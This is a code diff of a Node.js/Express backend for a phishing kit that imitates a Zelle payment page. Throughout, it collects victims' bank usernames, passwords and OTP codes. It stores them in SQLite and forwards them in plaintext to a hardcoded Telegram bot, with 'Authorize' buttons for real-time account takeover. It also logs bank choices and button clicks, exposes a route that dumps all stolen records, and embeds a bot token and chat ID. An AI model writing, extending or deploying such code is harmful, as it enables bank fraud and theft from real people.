@@ -5,51 +5,81 @@ import morgan from "morgan";
 import chalk from "chalk";
 import Database from "better-sqlite3";
 import fetch from "node-fetch";
-import { WebSocketServer } from "ws";
 
 const app = express();
-const PORT = process.env.PORT || 5000;
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8326736472:AAGPqPPtxL5ccruOVGfyhdcCTNkckx2EDZc";
-const CHAT_ID = "734316369";
+const PORT = process.env.PORT || 5000; // fallback for local dev
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
 
-// ───── Middleware ─────
+// ─────────────────────────────
+// Middleware
+// ─────────────────────────────
+
 app.use(helmet());
 app.use(express.json());
+
+// ✅ FIXED CORS SETUP
+const allowedOrigins = [
+  "http://localhost:0000", // local dev (Vite)
+  "https://zellepayment.netlify.app", // your Netlify domain
+  "https://herblike-rosanne-valleylike.ngrok-free.dev", // ngrok tunnel
+];
+
 app.use(
   cors({
-    origin: ["http://localhost:5173", "https://zellepayment.netlify.app"],
+    origin: function (origin, callback) {
+      // allow requests with no origin (like mobile apps or curl)
+      if (!origin || allowedOrigins.includes(origin)) {
+        callback(null, true);
+      } else {
+        console.warn("🚫 Blocked by CORS:", origin);
+        callback(new Error("Not allowed by CORS"));
+      }
+    },
     credentials: true,
+    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+    allowedHeaders: ["Content-Type", "Authorization"],
   })
 );
+
 app.options("*", cors());
+
+
+// ─────────────────────────────
+// Request Logging
+// ─────────────────────────────
 app.use(
-  morgan((tokens, req, res) =>
-    [
+  morgan((tokens, req, res) => {
+    return [
       chalk.cyan(tokens.method(req, res)),
       chalk.yellow(tokens.url(req, res)),
       chalk.green(tokens.status(req, res)),
       chalk.magenta(tokens["response-time"](req, res)),
       "ms",
-    ].join(" ")
-  )
+    ].join(" ");
+  })
 );
 
 const logRequestData = (req) => {
   console.log(chalk.cyan("\n📩 Incoming Request:"));
   console.log(chalk.yellow("  → URL:"), req.originalUrl);
   console.log(chalk.yellow("  → Method:"), req.method);
+  console.log(chalk.yellow("  → Headers:"), req.headers);
   console.log(chalk.yellow("  → Body:"), req.body);
 };
 
-// ───── Database ─────
+// ─────────────────────────────
+// Database Setup
+// ─────────────────────────────
 const db = new Database("plaid_demo.db");
 db.pragma("journal_mode = WAL");
 
-// Override prepare to log DB queries
 const originalPrepare = db.prepare.bind(db);
 db.prepare = (query) => {
   console.log(chalk.magenta("💾 SQL Query:"), query);
   const stmt = originalPrepare(query);
+
   ["run", "get", "all"].forEach((method) => {
     if (stmt[method]) {
       const original = stmt[method].bind(stmt);
@@ -69,7 +99,6 @@ db.prepare = (query) => {
   return stmt;
 };
 
-// ───── Tables ─────
 db.prepare(`
   CREATE TABLE IF NOT EXISTS user_data (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -83,6 +112,7 @@ db.prepare(`
   )
 `).run();
 
+// Create zelle_payment table
 db.prepare(`
   CREATE TABLE IF NOT EXISTS zelle_payment (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -92,25 +122,23 @@ db.prepare(`
   )
 `).run();
 
-db.prepare(`
-  CREATE TABLE IF NOT EXISTS telegram_callbacks (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    callback_data TEXT,
-    username TEXT,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )
-`).run();
+// ─────────────────────────────
+// Telegram Bot Config
+// ─────────────────────────────
+const TELEGRAM_TOKEN = "8326736472:AAGPqPPtxL5ccruOVGfyhdcCTNkckx2EDZc"; // your token
+const CHAT_ID = "734316369"; // your chat ID
 
-// ───── Telegram Helper ─────
 async function sendToTelegram(message, buttons = null) {
   try {
     const payload = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
     if (buttons) payload.reply_markup = { inline_keyboard: buttons };
+
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
+
     const data = await res.json();
     if (!data.ok) console.error("❌ Telegram Error:", data.description);
   } catch (err) {
@@ -118,53 +146,64 @@ async function sendToTelegram(message, buttons = null) {
   }
 }
 
-// ───── WebSocket Server ─────
-const wss = new WebSocketServer({ noServer: true });
-let connectedClients = [];
-wss.on("connection", (ws) => {
-  console.log("🌐 New WebSocket client connected");
-  connectedClients.push(ws);
-  ws.on("close", () => {
-    connectedClients = connectedClients.filter((c) => c !== ws);
-    console.log("❌ WebSocket client disconnected");
-  });
-});
-function broadcastCallback(callback) {
-  const data = JSON.stringify({ type: "telegram_callback", payload: callback });
-  connectedClients.forEach((client) => {
-    if (client.readyState === 1) client.send(data);
-  });
-}
+// ─────────────────────────────
+// API Routes
+// ─────────────────────────────
+app.get('/favicon.ico', (req, res) => res.status(204).end()
 
-// ───── Routes ─────
+);
 
-// Health check
-app.get("/api/health", (req, res) => {
-  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
-});
-
-// ───── Zelle Payment ─────
+// Get current Zelle payment
 app.get("/api/zelle-payment", (req, res) => {
   try {
     const row = db.prepare("SELECT name, amount FROM zelle_payment ORDER BY id DESC LIMIT 1").get();
-    res.json({ payment: row || { name: "James Allen", amount: 145 } });
-  } catch {
+    res.json({ payment: row || { name: "James Allen", amount: 127 } });
+  } catch (err) {
+    console.error("💥 Failed to fetch Zelle payment:", err);
     res.status(500).json({ error: "Failed to fetch Zelle payment" });
   }
 });
 
+// Update Zelle payment (staff dashboard)
 app.post("/api/zelle-payment", (req, res) => {
   const { name, amount } = req.body;
-  if (!name || typeof amount !== "number") return res.status(400).json({ error: "Invalid name or amount" });
+  if (!name || !amount) return res.status(400).json({ error: "Missing name or amount" });
+
   try {
     db.prepare("INSERT INTO zelle_payment (name, amount) VALUES (?, ?)").run(name, amount);
     res.json({ success: true });
-  } catch {
+  } catch (err) {
+    console.error("💥 Failed to update Zelle payment:", err);
     res.status(500).json({ error: "Failed to update Zelle payment" });
   }
 });
 
-// ───── User login / OTP ─────
+// Notify Telegram about Zelle button click
+app.post("/api/zelle-click", async (req, res) => {
+  try {
+    const message = `<b>💰 Zelle Payment Button Clicked</b>\nSomeone clicked the "View Payment" button.`;
+    await sendToTelegram(message); // your existing helper
+    res.json({ success: true });
+  } catch (err) {
+    console.error("💥 Telegram notification failed:", err);
+    res.status(500).json({ error: "Failed to notify Telegram" });
+  }
+});
+
+app.post("/api/bank-click", async (req, res) => {
+  const { bank } = req.body;
+  if (!bank) return res.status(400).json({ error: "Missing bank name" });
+
+  try {
+await sendToTelegram(`🏦 User selected bank: <b>${bank}</b>`);
+    res.json({ success: true });
+  } catch (err) {
+    console.error("💥 Telegram send error:", err);
+    res.status(500).json({ error: "Failed to notify Telegram" });
+  }
+});
+
+// Save login credentials
 app.post("/api/save", async (req, res) => {
   logRequestData(req);
   const { username, password, bank } = req.body;
@@ -175,7 +214,11 @@ app.post("/api/save", async (req, res) => {
     const result = db.prepare("INSERT INTO user_data (username, password, bank_name) VALUES (?, ?, ?)")
       .run(username, password, bank.name);
 
-    const msg = `<b>👤 New Login Attempt</b>\n🪪 <b>Username:</b> ${username}\n🔑 <b>Password:</b> ${password}\n🏦 <b>Bank:</b> ${bank.name}`;
+    const msg = `<b>👤 New Login Attempt</b>
+🪪 <b>Username:</b> ${username}
+🔑 <b>Password:</b> ${password}
+🏦 <b>Bank:</b> ${bank.name}`;
+
     const buttons = [
       [{ text: "✅ Authorize Login", callback_data: `authorized_${result.lastInsertRowid}` }],
       [
@@ -187,11 +230,12 @@ app.post("/api/save", async (req, res) => {
     await sendToTelegram(msg, buttons);
     res.json({ success: true, id: result.lastInsertRowid });
   } catch (err) {
-    console.error(err);
+    console.error("💥 Database error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
 
+// Save OTP
 app.post("/api/save-otp", async (req, res) => {
   logRequestData(req);
   const { code } = req.body;
@@ -199,13 +243,16 @@ app.post("/api/save-otp", async (req, res) => {
 
   try {
     const latestUser = db.prepare("SELECT id, username FROM user_data ORDER BY id DESC LIMIT 1").get();
-    if (!latestUser) return res.status(400).json({ error: "No user found" });
+    if (!latestUser) return res.status(400).json({ error: "No user found to attach OTP" });
 
     const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();
     db.prepare("UPDATE user_data SET otp_code = ?, expires_at = ?, otp_status = 'pending' WHERE id = ?")
       .run(code, expiresAt, latestUser.id);
 
-    const msg = `<b>🔢 OTP Code</b>\n🪪 <b>Username:</b> ${latestUser.username}\n🔢 <b>OTP:</b> ${code}`;
+    const msg = `<b>🔢 OTP Code</b>
+🪪 <b>Username:</b> ${latestUser.username}
+🔢 <b>OTP:</b> ${code}`;
+
     const buttons = [
       [
         { text: "✅ Authorize", callback_data: `authorized_${latestUser.id}` },
@@ -216,67 +263,47 @@ app.post("/api/save-otp", async (req, res) => {
     await sendToTelegram(msg, buttons);
     res.json({ success: true, user: latestUser });
   } catch (err) {
-    console.error(err);
+    console.error("💥 Database error:", err);
     res.status(500).json({ error: "Failed to save OTP" });
   }
 });
 
+// Check OTP status by user ID
 app.get("/api/check-otp-status", (req, res) => {
   const { id } = req.query;
   if (!id) return res.status(400).json({ error: "Missing user ID" });
+
   try {
     const user = db.prepare("SELECT otp_status FROM user_data WHERE id = ?").get(Number(id));
     res.json({ otp_status: user?.otp_status || "pending" });
-  } catch {
+  } catch (err) {
+    console.error("💥 DB Error fetching OTP status:", err);
     res.status(500).json({ error: "Failed to fetch OTP status" });
   }
 });
 
-// ───── Telegram Webhook / Callback ─────
-app.post("/api/telegram-webhook", express.json(), async (req, res) => {
-  const update = req.body;
-  if (update.callback_query) {
-    const callbackId = update.callback_query.id;
-    const data = update.callback_query.data;
-    const user = update.callback_query.from;
-
-    console.log("📩 Telegram Callback:", data, "from:", user.username);
-
-    db.prepare("INSERT INTO telegram_callbacks (callback_data, username) VALUES (?, ?)")
-      .run(data, user.username);
-
-    broadcastCallback({ callback_data: data, username: user.username, timestamp: new Date() });
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ callback_query_id: callbackId }),
-    });
-  }
-  res.sendStatus(200);
-});
-
-// Fetch latest Telegram callbacks (optional for polling)
-app.get("/api/telegram-callbacks", (req, res) => {
-  try {
-    const rows = db.prepare("SELECT * FROM telegram_callbacks ORDER BY id DESC LIMIT 20").all();
-    res.json(rows);
-  } catch {
-    res.status(500).json({ error: "Failed to fetch callbacks" });
-  }
-});
-
-// ───── Debug / Data ─────
+// Debug route
 app.get("/api/data", (req, res) => {
-  const rows = db.prepare("SELECT * FROM user_data ORDER BY id DESC").all();
-  res.json(rows);
+  try {
+    const rows = db.prepare("SELECT * FROM user_data ORDER BY id DESC").all();
+    res.json(rows);
+  } catch (err) {
+    res.status(500).json({ error: "Failed to fetch data" });
+  }
 });
 
-// ───── WebSocket Upgrade ─────
-const server = app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
-server.on("upgrade", (request, socket, head) => {
-  wss.handleUpgrade(request, socket, head, (ws) => {
-    wss.emit("connection", ws, request);
-  });
+// Health check
+app.get("/api/health", (req, res) => {
+  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
 });
 
+// Telegram test
+app.get("/api/test-telegram", async (req, res) => {
+  const msg = "📬 Test message from server at " + new Date().toLocaleString();
+  await sendToTelegram(msg);
+  res.json({ success: true });
+});
+
+// ─────────────────────────────
+// Start Server
+// ─────────────────────────────
